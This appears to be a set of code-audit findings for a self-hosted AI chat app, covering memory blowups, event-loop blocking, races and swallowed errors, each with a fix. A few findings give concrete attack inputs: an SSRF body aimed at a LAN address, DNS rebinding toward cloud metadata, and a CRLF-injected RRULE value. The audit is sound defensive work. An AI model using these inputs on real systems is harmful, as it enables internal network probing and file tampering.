title: Model weights re-downloaded / re-loaded into memory on every request (no singleton cache)
detail: denoise_image constructs a new RealESRGANer with a URL model_path on every call (lines 1459-1465), upscale_image_local likewise (lines 1507-1512), enhance_face builds a new GFPGANer with a GitHub URL model_path per request (lines 1641-1648), and remove_background creates a fresh transformers pipeline('image-segmentation', model='briaai/RMBG-1.4') per request (line 1584). First call triggers a synchronous multi-hundred-MB download inside the async handler; every subsequent call re-loads the ~65MB-1.7GB weights from disk into fresh tensors that are only freed by GC after the response. Concrete scenario: 4 concurrent denoise requests each hold their own copy of the network in RAM -> multi-GB spike -> OOM kill on a modest host; even serially, per-request load adds seconds of latency and memory churn. The transformers pipeline additionally re-downloads the HF model if the cache is cold.
fix: Create lazily-initialized module-level singletons guarded by a threading.Lock (e.g. _get_upsampler(), _get_gfpgan(), _get_rmbg_pipeline()) and reuse them across requests; download weights once to a persistent path at first use.

title: JSON image endpoints accept unbounded base64 payloads with no size limit
detail: The multipart upload paths enforce limits via read_upload_limited (GALLERY_UPLOAD_MAX_BYTES / GALLERY_TRANSFORM_UPLOAD_MAX_BYTES), but every JSON-body image endpoint does 'await request.json()' then base64.b64decode with no cap: sharpen_image (line 1415), denoise_image (line 1448), upscale_image_local (line 1497), remove_background (line 1546), enhance_face (line 1630), inpaint_proxy (lines 1085-1086), and harmonize_image (image forwarded verbatim). Concrete scenario: an authenticated user (or anyone in a no-auth local deployment) POSTs a 2GB base64 blob to /api/image/sharpen; the server materializes ~2GB for the JSON string plus ~1.5GB decoded bytes plus a decompressed PIL image (a small PNG bomb decodes to a gigantic bitmap) -> memory exhaustion / OOM. PIL decompression-bomb warnings aside, nothing bounds this path.
fix: Reject oversized bodies before decoding: check request.headers['content-length'] and len(image_b64) against GALLERY_TRANSFORM_UPLOAD_MAX_BYTES, and set Image.MAX_IMAGE_PIXELS (or verify img.size) before processing.

title: download-zip builds the entire archive in RAM from an unbounded id list
detail: gallery_download_zip accepts an arbitrary-length 'ids' array, then writes every matching file into an in-memory io.BytesIO ZipFile (lines 781-797) and finally copies it again via buf.getvalue() (line 802). With the 100MB per-file upload limit, a user selecting a few hundred of their own photos/videos (video ZIP_DEFLATED compresses poorly) yields a multi-GB buffer held twice in memory. The zipfile.write calls are also synchronous disk reads+compression inside an async handler, blocking the event loop for the whole archive build. Concrete scenario: 'Select all' on a 300-photo/video library -> several GB RSS spike and a frozen event loop for the duration.
fix: Cap the number of ids and/or total bytes, and stream the archive (StreamingResponse over a SpooledTemporaryFile or a streaming-zip library) with the compression work in a thread executor.

title: Registered-endpoint restriction on client-supplied _endpoint is skipped for anonymous users (SSRF vector)
detail: In inpaint_proxy and harmonize_image, when the client supplies '_endpoint' and no matching DB endpoint exists, the request is only rejected 'elif user and not _current_user_is_admin(...)' (lines 1060-1061 and 1254-1255). When get_current_user/require_privilege yields user=None (no-auth deployments, which this app explicitly supports elsewhere via 'if user:' guards), the elif is False and the server proceeds to POST the request body to the arbitrary client-chosen URL. check_outbound_url is applied, but with block_private defaulting to false (IMAGE_BLOCK_PRIVATE_IPS unset, lines 1026/1229), private/LAN addresses pass. Concrete scenario: on a no-auth install, any client on the network posts {'_endpoint': 'http://192.168.1.10:9000/internal'} to /api/image/inpaint and uses the server to probe/hit internal HTTP services (response codes and bodies partially reflected via the error strings at lines 1191, 1362, 1398-1401).
fix: Apply the 'Choose a registered image endpoint' rejection whenever no matching DB endpoint is found and the caller is not an admin — i.e. 'elif not _current_user_is_admin(request, user): raise HTTPException(403, ...)' — instead of gating it on 'user and'.

title: gallery_library re-scans every image row's tags (and all IDs for shuffle) on every page request
detail: Each call to GET /api/gallery/library — i.e. every pagination/scroll fetch — runs 'tag_q.all()' loading the tags column of every active image for the user and splits them in Python (lines 451-461), plus a distinct-models query, plus q.count() and a second full count for total_tagged (lines 517-522). With sort=shuffle it additionally loads ALL matching image IDs into a Python list and shuffles them per request (lines 531-534). Concrete scenario: a 50k-photo library scrolling in 24-item pages issues ~2,000 requests, each doing two full-table scans and (shuffled) a 50k-row ID fetch — O(n) work per page, quadratic overall, all on the event loop with sync SQLAlchemy/SQLite.
fix: Serve the tag/model facet lists from the existing /api/gallery/tags-style endpoint (fetched once by the UI) or cache them; for shuffle, order by a seeded deterministic expression in SQL (e.g. ORDER BY (id*seed)%N or a hash) with OFFSET/LIMIT instead of materializing all IDs.

title: list_albums issues 2-3 queries per album (N+1)
detail: For each album, list_albums runs a COUNT query (lines 585-590), possibly a cover lookup by id (line 593), and possibly another ORDER BY...first() query for the fallback cover (lines 597-602). A user with 200 albums pays ~400-600 sequential SQLite queries per page load of the albums view, on the event loop.
fix: One grouped query for counts (db.query(GalleryImage.album_id, func.count(), func.max(created_at)).group_by(album_id)) and one IN-query for covers, then assemble in Python.

title: Image file unlinked from disk before the soft-delete commits
detail: delete_gallery_image removes the file (img_path.unlink(), lines 911-913) before db.commit() of is_active=False (line 917). If the commit fails (locked SQLite database under concurrency), the except block rolls back and returns 500 — but the file is already gone, leaving an active DB row pointing at nothing: the gallery shows a permanently broken image that can't be re-deleted cleanly (subsequent delete succeeds only because unlink is guarded by exists()). The mirror-image problem exists in gallery_upload (line 161): the file is written before the INSERT commits, so a failed commit orphans the file on disk forever.
fix: Commit the soft-delete first, then unlink the file (logging unlink failures); in upload, clean up the written file in an except path if the commit fails.

title: Non-atomic read-modify-write races: favorite toggle and upload dedupe
detail: toggle_favorite does 'img.favorite = not img.favorite' (line 1782) — two rapid double-clicks land in interleaved sessions, both read favorite=False, both write True, and the second toggle is lost (UI shows unfavorited, DB says favorited). Similarly gallery_upload's dup check (SELECT at lines 139-145) and the INSERT+commit (line 187) are not atomic: two concurrent uploads of the same file both pass the check and both insert, defeating the SHA-256 dedupe the code relies on ('Recompute hash so dedupe stays accurate', line 299).
fix: For favorite: UPDATE gallery_images SET favorite = NOT favorite WHERE id=:id in one statement. For dedupe: unique index on (owner, file_hash) with is_active, catching IntegrityError as the duplicate path.

title: sharpen_image crashes with 500 on missing or non-numeric input
detail: sharpen_image does 'body.get("amount", 50) / 100.0' (line 1410) — a client sending amount as a string ("50") raises TypeError, and image_b64=None reaches base64.b64decode(None) (line 1415) raising TypeError; both surface as unhandled 500s instead of a 400, unlike sibling endpoints (denoise/upscale) which validate and coerce. remove_background has the same missing-image gap at line 1546.
fix: Validate as in denoise_image: raise HTTPException(400) when image is absent and coerce amount with try/float, clamping to a sane range.

title: Blocking HTTP probes and sync SQLAlchemy inside async handlers stall the event loop
detail: _resolve_model() does synchronous httpx.get(models_url, timeout=5) per endpoint plus sync SessionLocal() queries, and is called from async handlers (do_chat_with_model line 173, do_pipeline line 651 — up to 10 steps, each re-probing every endpoint, do_generate_image lines 1602-1608 — up to 3 candidate probes). Same pattern in do_list_models (line 1143, sync httpx.get per endpoint), do_generate_image's fallback (line 1629, _req.get timeout=3 per image endpoint), and the DALL-E download at line 1743: sync httpx.get(img['url'], timeout=60) inside an async def. Failure scenario: with 4 configured endpoints where one is unreachable, a single chat_with_model call blocks the FastAPI event loop for up to ~20s (5s x 4); the DALL-E path can freeze the whole server for up to 60s — every other user's request stalls during that time.
fix: Make _resolve_model async and use httpx.AsyncClient (or wrap calls in asyncio.to_thread / run_in_executor); use the already-open AsyncClient for the line-1743 download (await client.get(...)); run sync DB work via to_thread or async session. Cache _resolve_model results per (spec, owner) for do_pipeline so N steps don't re-probe endpoints N times.

title: Memory add/edit/delete are non-atomic load_all-modify-save with no lock — concurrent writes are lost
detail: do_manage_memory edit (lines 1015-1029), delete (1046-1061), and add (988-990) each do memories = _memory_manager.load_all(); mutate the full list; _memory_manager.save(memories) with no locking. Because this runs in an async app, two overlapping tool calls (two sessions, two users — load_all is global across owners) interleave at the awaits/IO between load and save. Failure scenario: user A adds a memory while user B deletes one; whichever save() lands last overwrites the other's change, silently destroying A's new memory or resurrecting B's deleted one. Since save() writes the entire store, one lost race can clobber another user's data.
fix: Guard the read-modify-write with a module-level asyncio.Lock (or push atomic add/edit/delete operations into the memory manager itself, e.g. per-entry DB rows), so load_all→save is a critical section.

title: send_to_session owner check bypassed for sessions with unset owner
detail: The guard is `if owner and getattr(sess, 'owner', None) and sess.owner != owner:` — if the target session's owner attribute is None/empty (legacy rows, sessions created before owner tracking, or manager-created sessions where owner wasn't persisted in memory), the middle conjunct is falsy and the check is skipped entirely, so any authenticated user can read another context's history (get_context_messages at line 563) and inject messages into it. do_manage_session by contrast filters strictly with DbSession.owner == owner (line 783), so this function is the inconsistent, weaker path. Failure scenario: multi-user deployment with pre-migration sessions — user B sends `send_to_session\n<sid>\n...` with user A's session id and receives A's conversation context in the model reply.
fix: When owner is set, deny unless sess.owner == owner (treat missing owner as not a match): `if owner and getattr(sess, 'owner', None) != owner: return not-found`.

title: Gallery DB session leaked when commit raises in _save_to_gallery
detail: _save_to_gallery (lines 1707-1728) opens _gdb = _GallerySL() and calls _gdb.close() only on the success path; the surrounding except catches the exception and returns '' but never closes the session. Failure scenario: GalleryImage commit fails repeatedly (e.g. locked SQLite file, schema mismatch, disk full) — every image generation leaks one checked-out connection from the SQLAlchemy pool; after pool_size+overflow leaks, all DB access across the app hangs on pool checkout timeouts.
fix: Use try/finally (or `with _GallerySL() as _gdb:` on SQLAlchemy 1.4+) so _gdb.close() always runs.

title: Empty/short memory_id prefix silently matches the first memory entry
detail:
edit and delete locate the target with m.get('id','').startswith(memory_id). If line 2 is blank (edit with a stray blank line still passes the len(lines)>=3 check) memory_id is '' and startswith('') is True, so the FIRST memory in the store gets edited or deleted; a 1-char prefix likewise picks an arbitrary ambiguous match. Failure scenario: the agent emits `manage_memory
edit

new text` — a random unrelated memory (possibly the first entry in the global store) is overwritten with no error.
fix: Reject memory_id shorter than e.g. 6 chars, and error out if the prefix matches more than one entry.

title: Vector-index update failures swallowed with bare pass — index silently drifts from memory store
detail: The _memory_vector.add/remove calls after add (996-997), edit (1035-1036), and delete (1067-1068) are wrapped in `except Exception: pass` with no logging. Failure scenario: the vector backend starts erroring (index corrupted, embedding endpoint down after the healthy check) — memories keep being added/edited/deleted in the JSON store while the vector index diverges permanently; semantic memory search then returns deleted memories and misses new ones with zero diagnostic trail. Similarly, _resolve_model's `except Exception: continue` at lines 101-102 and 132-133 turns endpoint misconfiguration (bad key, DNS failure) into a misleading generic "Model not found on any configured endpoint".
fix: Replace bare `pass` with logger.warning(..., exc_info=True); in _resolve_model, collect per-endpoint errors and include them in the final ValueError message.

title: do_list_sessions loads every user's session rows just to read timestamps
detail: db.query(DbSession).all() materializes every session row for all users (full ORM objects) on every list_sessions call, even though only the caller's sessions (get_sessions_for_user(owner)) and only 1-3 timestamp columns are needed. Failure scenario: a deployment with tens of thousands of sessions makes each 'list my chats' tool call load the whole table into memory and iterate it, adding latency and memory churn to a hot agent tool.
fix: Query only the caller's sessions and only the needed columns: db.query(DbSession.id, DbSession.last_accessed, DbSession.updated_at, DbSession.created_at).filter(DbSession.owner == owner) (or filter by the ids from get_sessions_for_user).

title: Synchronous web search / RAG network I/O blocks the event loop inside async build_chat_context
detail: build_chat_context is 'async def' (called from the async chat_stream handler, routes/chat_routes.py:690) but line 612 calls chat_processor.build_context_preface(...) synchronously. That method (src/chat/processor.py:295-300) runs comprehensive_web_search() and rag_manager.search() — blocking HTTP and vector-store I/O. Failure scenario: one user sends a message with use_web=true against a slow search backend; the entire asyncio event loop stalls for the full search duration (seconds to tens of seconds), freezing every other user's SSE stream and request on the server.
fix: Run the preface build off-loop: `preface, rag_sources, web_sources = await asyncio.to_thread(chat_processor.build_context_preface, **_preface_kwargs)`, or make build_context_preface async and use an async HTTP client for the web search.

title: normalize_model_id performs a blocking httpx.get to /models inside async build_chat_context
detail: When _normalize_model_id_from_cache returns None (endpoint has no cached_models), line 627 falls back to normalize_model_id(sess.endpoint_url, sess.model), which calls list_model_ids → httpx.get(models_url, timeout=LLMConfig.DEFAULT_TIMEOUT) synchronously (src/llm_core.py:1055). Failure scenario: a session points at an unreachable or slow local endpoint (e.g. a stopped Ollama); every chat request against it blocks the whole event loop up to DEFAULT_TIMEOUT before the LLM call even starts, and all concurrent users' streams stall.
fix: Wrap the fallback in a thread: `norm = _normalize_model_id_from_cache(sess) or await asyncio.to_thread(normalize_model_id, sess.endpoint_url, sess.model)` (and pass a short explicit timeout for this probe).

title: Fire-and-forget asyncio.create_task results are never stored — tasks can be garbage-collected mid-run and their exceptions are lost
detail: asyncio.create_task is called at lines 373, 962, 1001, 1014, and 1021 without keeping any reference. Per CPython docs the event loop holds only a weak reference to tasks, so a pending memory-extraction (line 962), skill-extraction (1001), webhook (373/1014), or auto-name (1021) task can be garbage-collected before it finishes; when it does run and raises, the exception is only reported at GC time ('Task exception was never retrieved') and the failure is silent. Failure scenario: under memory pressure a user's memory-extraction task is collected mid-await — memories are silently never stored, with no log at the time of loss.
fix: Add a module-level set (e.g. _bg_tasks = set()) and a helper `def _spawn(coro): t = asyncio.create_task(coro); _bg_tasks.add(t); t.add_done_callback(_bg_tasks.discard); t.add_done_callback(lambda t: t.exception() and logger.error(...))`, and use it for all five create_task sites.

title: _enforce_chat_privileges fails open when get_current_user raises
detail: Lines 102-107: any exception from get_current_user(request) (auth-store DB error, malformed/expired token raising HTTPException, etc.) is swallowed, user becomes None, and the function returns immediately — skipping both the allowed_models 403 gate and the max_messages_per_day 429 gate that the route comments say must fire BEFORE any LLM work. Failure scenario: a transient auth-store error (or a token that makes get_current_user raise instead of return None) lets a capped/restricted user's request bypass the daily-cap and model-allowlist checks and spend LLM tokens on a forbidden model.
fix: Only treat 'not authenticated' as a no-op: catch the specific 'unauthenticated' condition (or check for a None return) and re-raise HTTPException/unexpected errors, e.g. `except HTTPException: raise` before the broad handler, and log unexpected exceptions instead of silently continuing.

title: Endpoint API keys cached in shared dogpile region with no owner scoping
detail: _cached_enabled_endpoints (lines 27-40) serializes every enabled endpoint's plaintext api_key into the db_region dogpile cache under a single global key, with no owner filter (contrast try_fallback_endpoint line 246 and resolve_session_auth line 420, which both apply owner_filter). Failure scenario: any future caller of get_enabled_endpoints_cached() in a multi-user request path (it is an exported public helper) hands user A's API key to user B; additionally, if db_region is backed by a file/redis backend, raw provider keys are persisted outside the DB. Currently no production caller exists (tests only), which is why this is medium rather than high — it is a loaded footgun.
fix: Drop api_key from the cached payload (resolve it on demand via resolve_endpoint_runtime with the caller's owner), or make the cache key owner-scoped (`cache_on_arguments` over an `owner` parameter) and filter the query with owner_filter.

title: Sync SQLite/file I/O in helpers called directly from async request handlers
detail: _enforce_chat_privileges (SessionLocal + JOIN/count, lines 132-143), resolve_session_auth (endpoint scan + updates, lines 409-457), _normalize_model_id_from_cache (line 490), load_prefs_for_user (sync JSON file read, invoked at line 569), and accumulate_token_usage (line 662) all do blocking DB/file I/O and are called synchronously from the async chat_stream/chat handlers (chat_routes.py:615/815/818) or from async build_chat_context. Failure scenario: with SQLite under write contention (default busy timeout), the per-message COUNT join at line 134 or the session-header UPDATE in resolve_session_auth stalls the event loop for the lock-wait duration, freezing all concurrent streams — this compounds per message since these run on every chat turn.
fix: Call these via `await asyncio.to_thread(...)` from the async paths (or convert to an async DB session). At minimum move _enforce_chat_privileges' count query and resolve_session_auth to to_thread in the chat routes.

title: accumulate_token_usage uses a non-atomic read-modify-write and silently swallows failures
detail: Lines 664-668 read total_input_tokens/total_output_tokens into Python, add, and commit. Two concurrent completions for the same session (compare mode fires two model responses; two tabs on one session) can interleave read-before-write and one increment is lost, permanently undercounting usage — which also feeds the max_messages_per_day/billing-adjacent stats. The bare `except Exception: db.rollback()` at line 669 additionally hides every persistence failure with no log.
fix: Use an atomic SQL increment: `db.query(DBSession).filter(DBSession.id == session_id).update({DBSession.total_input_tokens: func.coalesce(DBSession.total_input_tokens, 0) + in_t, DBSession.total_output_tokens: func.coalesce(DBSession.total_output_tokens, 0) + out_t}); db.commit()`, and log the exception in the handler.

title: Blocking synchronous DB and CPU-heavy work inside async handlers stalls the event loop
detail: Every route in this file is 'async def' but does fully synchronous work on the event loop thread: SessionLocal() SQLAlchemy/SQLite queries (lines 850, 872, 900, 957, 1029, 1083, 1108, 1130, 1151, 1177, 1310), icalendar parsing of an up-to-10MB upload via iCal.from_ical(content) (line 1180), and RRULE expansion of up to 1000 occurrences per recurring event (lines 935-937 calling _expand_rrule). Concrete failure: one user POSTs a 10MB .ics to /api/calendar/import, or GETs /events over a multi-year window with dozens of recurring events — the event loop is blocked for seconds, freezing ALL concurrent requests app-wide (including chat/LLM streaming) since FastAPI runs 'async def' handlers directly on the loop, not in the threadpool.
fix: Declare the DB-only handlers as plain 'def' so FastAPI runs them in its threadpool, or keep 'async def' and wrap the DB/parse/expand work in anyio.to_thread.run_sync / loop.run_in_executor. At minimum move import_ics parsing+insert loop and list_events expansion off the loop.

title: SSRF DNS-rebinding bypass in /test: hostname validated with one resolution, connected with another
detail: test_connection validates the user-supplied URL via validate_caldav_url (line 789), which resolves the hostname once (socket.getaddrinfo in src/calendar_app/sync.py:_validate_caldav_hostname) and checks the IPs against private/loopback ranges. httpx then independently re-resolves the same hostname for the actual PROPFIND (lines 799-817). Concrete failure: attacker registers a domain whose DNS alternates (or has TTL 0) between a public IP and 169.254.169.254 / 127.0.0.1 / 10.x — validation sees the public IP and passes, the connection goes to the internal address. The endpoint then acts as an internal-network oracle: distinct responses for 200/207 vs 401 vs 404 vs connection-refused (lines 820-832) let an authenticated user port-scan and probe cloud metadata or internal services. Same TOCTOU applies to URLs persisted via save_config/add_caldav_account and later used by the sync loop.
fix: Pin the validated IP: resolve once, connect to the literal IP with a Host header and proper SNI (custom httpx transport), or re-check the connected socket's peer address against the blocklist before sending; alternatively validate inside a custom resolver used by the HTTP client.

title: Blocking DNS resolution (socket.getaddrinfo) inside async handlers
detail: validate_caldav_url performs synchronous socket.getaddrinfo and is awaited nowhere — it is called directly on the event loop in async handlers save_config (line 639), add_caldav_account (line 693), update_caldav_account (line 727) and test_connection (line 789). Concrete failure: a user submits a URL whose nameserver is unresponsive; getaddrinfo blocks until the OS resolver timeout (commonly 5-30s), during which the entire server processes zero requests.
fix: Call it via anyio.to_thread.run_sync(validate_caldav_url, url) in these handlers, or refactor validation to use loop.getaddrinfo (async).

title: N+1 dedup query in ICS import — one SELECT per VEVENT
detail: import_ics runs db.query(CalendarEvent).filter(calendar_id, dtstart, summary).first() once per VEVENT with a source uid (lines 1230-1238). Concrete failure: importing a realistic exported calendar with 20k events issues 20k sequential SELECTs (each with Python/SQLAlchemy overhead) inside the blocked event loop — multi-second to minute-scale import while the whole app is frozen (compounds the blocking finding above).
fix: Before the loop, fetch existing (dtstart, summary) pairs for target_cal.id in one query into a set, and dedup in memory: `existing = {(e.dtstart, e.summary) for e in db.query(CalendarEvent.dtstart, CalendarEvent.summary).filter(CalendarEvent.calendar_id == target_cal.id)}`.

title: CalDAV writeback failure after local commit returns 500 for a change that succeeded — retry creates duplicates
detail: create_event commits the row (line 1001) then awaits writeback_event (line 1006) inside the same try block. If the remote push raises (server down, auth expired), control lands in the except at line 1015: db.rollback() is a no-op after commit, and the client receives 500 'Failed to create event' even though the event exists locally. Concrete failure: the frontend or LLM agent retries the POST and a duplicate event is created. Same pattern in update_event (commit line 1057, writeback line 1061) and delete_event (commit line 1091, writeback line 1094 — retry then yields a spurious 404).
fix: Wrap each writeback_event call in its own try/except that logs the sync failure and still returns {"ok": True, "sync": "pending"} (or queue the push for the periodic sync), so the response reflects the committed local state.

title: Non-atomic read-modify-write of CalDAV account list — concurrent requests silently lose accounts
detail: add_caldav_account (lines 706-708), update_caldav_account (719-738), delete_caldav_account (745-749) and save_config (633-653) all do _get_caldav_accounts → mutate the Python list → _save_caldav_accounts with no locking or versioning. Concrete failure: user adds account A in one tab while the app adds account B (or /config saves) concurrently — both read the same base list, the second _save_for_user overwrites the first, and one account's credentials vanish without any error.
fix: Serialize mutations with an asyncio.Lock keyed by owner around the read-modify-write, or make the prefs store support an atomic compare-and-swap / row-level UPDATE.

title: Legacy POST /config with empty url wipes ALL multi-accounts, not just the first
detail: save_config documents itself as 'upserts the first account', but the clear path (lines 634-636) executes _save_caldav_accounts(owner, []) — deleting every configured account. Concrete failure: a user with three accounts configured via the multi-account UI opens the legacy settings pane and clears the URL field (or an old client posts {url: ""}); all three accounts, including encrypted passwords, are destroyed with no confirmation.
fix: On empty url, drop only the first account: `_save_caldav_accounts(owner, accounts[1:])` (and keep the prefs.pop('caldav') migration).

title: Duplicate route registration: DELETE /calendars/{cal_id} defined twice; second handler is dead code with a swallowed exception
detail: Two handlers register @router.delete("/calendars/{cal_id}") — line 847 and line 1148. FastAPI matches the first registered, so the second is unreachable. Impact today is masked (ORM cascade 'all, delete-orphan' on CalendarCal.events deletes child rows anyway), but the dead handler contains a latent bug: its except block (lines 1160-1162) returns HTTP 200 with {"error": str(e)}, hiding failures from clients and leaking the raw exception string. Concrete failure scenario: a refactor moving or reordering the handlers activates the second one, and calendar-delete failures start returning 200s that frontends treat as success.
fix: Delete one of the two handlers (keep the owner-filtered one at line 847); if keeping the second, replace the 200-with-error return with `raise HTTPException(500, "Failed to delete calendar")` and log.

title: Unvalidated/unescaped RRULE written verbatim into ICS export — CRLF line injection
detail: EventCreate.rrule / EventUpdate.rrule accept any string with no validation, and export_ics emits it raw: f"RRULE:{ev.rrule}" (line 1340), unlike SUMMARY/DESCRIPTION/LOCATION which go through _ics_escape. Concrete failure: an rrule value containing "FREQ=DAILY\r\nATTENDEE:mailto:x@evil\r\nX-ANY:..." (settable via the API or by an LLM agent acting on a prompt-injected instruction) injects arbitrary ICS properties/components into the exported file, which the user may then share or import into another calendar client.
fix: Validate rrule at write time in create_event/update_event (strip CR/LF, attempt rrulestr(value) and 400 on failure), and/or strip CR/LF at export: `ev.rrule.replace('\r', '').replace('\n', '')`.

title: gh api --paginate output is concatenated JSON arrays; json.loads fails past 100 items
detail: `gh api --paginate` on an array endpoint emits one JSON array PER PAGE, back to back (e.g. `[...][...]`), unless `--slurp` is passed. `_run_gh_json` (line 257) parses stdout with a single json.loads, which raises JSONDecodeError('Extra data') on any multi-page response. Concrete failures: (1) `_fetch_live_pr_files` (line 248) — any PR with >100 changed files makes the second page trigger the parse error, which is converted to RuntimeError and caught at line 222, so the PR is silently recorded as 'missing changed-file metadata' even though the data was fetchable; the whole overlap/hot-file analysis then under-reports exactly the largest, riskiest PRs. (2) The fallback list path at line 177 — a repo with >100 open PRs (limit defaults to 1000) gets two pages, json.loads fails, and the script exits with 'error: gh returned invalid JSON' after `gh pr list` already failed once.
fix: In the two --paginate call sites pass `--slurp` (gh >= 2.45) and flatten the resulting array-of-arrays, or make _run_gh_json parse concatenated documents with a json.JSONDecoder().raw_decode loop over stdout and merge list results.

title: N+1 sequential subprocess+HTTP round trip per PR when file metadata is missing
detail: `_fill_missing_live_files` loops over every PR lacking a `files` field and calls `_fetch_live_pr_files`, which spawns a fresh `gh api` subprocess (full process fork + TLS handshake + API call) serially. In the fallback path (line 176-178) the REST /pulls list contains no file data at all, so ALL PRs take this path: with the default --limit 1000 that is up to 1000 sequential subprocess spawns and API round trips — easily 15-30+ minutes and a large chunk of the API rate limit. The same happens in the primary path whenever `gh pr list` omits files for large PRs.
fix: Batch with a single GraphQL query fetching files(first:100) for many PRs per request, or at minimum parallelize the per-PR fetches with concurrent.futures.ThreadPoolExecutor (bounded, e.g. 8 workers), keeping the existing progress callback.

title: O(n^2) duplicate detection recomputes title keywords and file sets for every pair
detail: `duplicate_candidates` compares all PR pairs (lines 542-546); for the default limit of 1000 PRs that is ~500k calls to `_looks_similar`, and each call rebuilds `set(left.files)`, `set(right.files)` and runs `title_keywords` (regex findall + set build) on BOTH titles from scratch (lines 550-557). The same left-PR values are recomputed n-1 times each, turning an already quadratic pass into roughly 1M redundant regex scans and set constructions — seconds of avoidable CPU on large repos, executed once per render.
fix: Precompute `frozenset(pr.files)` and `title_keywords(pr.title)` once per PR into parallel lists before the pair loop, and skip pairs where either file set is empty before doing set algebra.

title: Fallback swallows the original gh error; missing gh binary produces a raw traceback
detail: Two swallowed-failure paths: (1) `except RuntimeError:` at line 175 discards the stderr from the failed `gh pr list` (e.g. 'gh: To get started with GitHub CLI, please run: gh auth login') and silently retries via REST; if the fallback then also fails, only the second error is shown, hiding the actionable root cause — and if the fallback succeeds, the report silently degrades (REST list payloads carry no mergeStateStatus/reviewDecision/files, so every PR scores with 'merge state unknown'). (2) If `gh` is not installed, subprocess.run at line 253 raises FileNotFoundError, which is not RuntimeError/ValueError, so main's handler at line 1044 misses it and the user gets an unhandled traceback instead of 'error: ...'.
fix: Log the original gh pr list error to stderr (unless --quiet) before falling back, and wrap subprocess.run in _run_gh_json with `except FileNotFoundError: raise RuntimeError("gh CLI not found on PATH")` (or add OSError to the tuple caught in main).

title: Synchronous httpx calls block the event loop inside async handlers
detail: Every route is 'async def' (list_contacts:690, search:696, add:714, import:731, export:747, edit:802, delete:819) but all CardDAV I/O uses the blocking sync httpx module-level API: httpx.request at line 274, httpx.get at 332, httpx.put at 386/476/637, httpx.delete at 666, each with timeout=10-15s. Because the handlers are async, FastAPI runs them on the event loop thread (no threadpool offload), so a single slow/unreachable CardDAV server stalls the ENTIRE application — every other request on the worker (including the LLM-agent endpoints) hangs for up to 10s per call, and _fetch_contacts can chain REPORT + GET fallback for ~20s. A hung TCP connection to the configured server is enough to freeze the whole app for all users.
fix: Either use 'await httpx.AsyncClient(...).request(...)' throughout (share one AsyncClient), or keep the helpers sync and declare the route functions as plain 'def' so FastAPI runs them in its threadpool (or wrap calls in starlette.concurrency.run_in_threadpool).

title: CSV import re-downloads the entire address book per row (O(rows x contacts) blocking network calls)
detail: In _import_csv_contacts, for every imported row that has a phone number the code calls _fetch_contacts(force=True) (line 569), which performs a full CardDAV REPORT downloading and parsing EVERY vCard in the address book, then does an extra _update_contact PUT (line 572). Each row also gets its own httpx.put via _create_contact with a fresh TCP/TLS handshake (line 386, no shared client). For a 500-row CSV against a 2000-contact book this is 500 full address-book downloads plus ~1000 PUTs, all sequential and all blocking the event loop (see previous finding) — the import request can hold the server hostage for many minutes, and other requests are starved the whole time.
fix: Build the vCard with the phone number in the first place: extend _create_contact (or call _build_vcard directly) to accept phones so no follow-up fetch+update is needed. If a lookup is unavoidable, fetch once after the loop, and reuse a single httpx Client/AsyncClient for all PUTs.

title: DELETE /clear poisons the contact cache when CardDAV is configured
detail: clear_contacts unconditionally calls _save_local_contacts([]) (line 795). _save_local_contacts (lines 114-115) also overwrites the in-memory cache with the empty list AND stamps fetched_at with now. With CardDAV configured, the next _fetch_contacts sees a fresh (<60s) cache and returns [] — GET /list and /search report zero contacts for up to a minute even though the CardDAV server still has them all, contradicting the endpoint's own docstring ('only clears the local fallback cache'). An agent or UI acting on that empty list (e.g. re-importing 'missing' contacts) creates duplicates.
fix: In clear_contacts, when _carddav_configured() is true, only rewrite the local JSON file without touching _contact_cache (or set _contact_cache['fetched_at'] = None after clearing to force a real re-fetch).

title: PUT /config accepts the masked '***' password and stores it as the real credential
detail: GET /config returns the password masked as '***' (lines 771-773). PUT /config (lines 778-786) writes any provided carddav_password verbatim to the settings file with no check for the mask sentinel. The standard round-trip — client GETs config, user edits the URL or username, client PUTs the whole object back — silently replaces the stored password with the literal string '***'. All subsequent CardDAV requests then fail auth; because _fetch_contacts swallows failures and returns the stale cache (lines 334-335, 340-342), the breakage is invisible until the cache is empty, making it very hard to diagnose.
fix: In update_config, skip persisting carddav_password when the incoming value equals the mask sentinel ('***') or is unchanged; only overwrite on a genuinely new value.

title: Fetch failures silently serve stale cache contents indefinitely, including contacts from a previously configured server
detail: _fetch_contacts returns _contact_cache['contacts'] on any non-200 (line 335) or exception (line 342) with only a log line — callers cannot distinguish 'fresh data' from 'server has been down for a week'. Worse, update_config only clears fetched_at (line 789) but leaves the contacts list, so after switching carddav_url to a new server that happens to error, /list keeps returning the OLD server's contacts as if current. Combined with the /add duplicate check (lines 721-724), this can wrongly report 'Already exists' based on data from a different account.
fix: Clear _contact_cache['contacts'] when the CardDAV config changes, and surface fetch failures to the caller (e.g. return a (contacts, stale) tuple or raise so routes can return an error/warning instead of silently stale data).

title: Swallowed exception drops CSV phone numbers while still counting the row as imported
detail: In _import_csv_contacts the phone-enrichment block is wrapped in 'except Exception: pass' (lines 573-574). If the re-fetch or _update_contact fails (network blip, 401 from the masked-password bug above), the phone number is silently discarded, the row is still counted in 'imported', and the response reports success — the user has no way to know their CSV's phone data never made it to the server.
fix: Log the exception at minimum, and track a separate counter (e.g. 'phones_failed') returned in the result dict so partial imports are visible.

title: ETags fetched but never used — concurrent edits and imports silently overwrite server-side changes
detail: The REPORT query explicitly requests D:getetag (line 263) but the etag is discarded. _update_contact (line 637), _create_contact (line 386) and _import_vcards (line 476) all PUT unconditionally with no If-Match/If-None-Match. Two admin sessions editing the same contact, or an import whose vCard UID collides with an existing contact, clobber the other write with no warning (classic lost update). The rebuilt vCard in _update_contact also drops any properties the app doesn't model (ADR, ORG, PHOTO), so an unconditional overwrite of an externally-managed card destroys that data.
fix: Capture the etag per href in _fetch_via_report, send 'If-Match: <etag>' on update/delete and 'If-None-Match: *' on create/import, and surface 412 Precondition Failed to the caller for a re-fetch-and-retry.

title: Child processes never killed when asyncio.wait_for times out
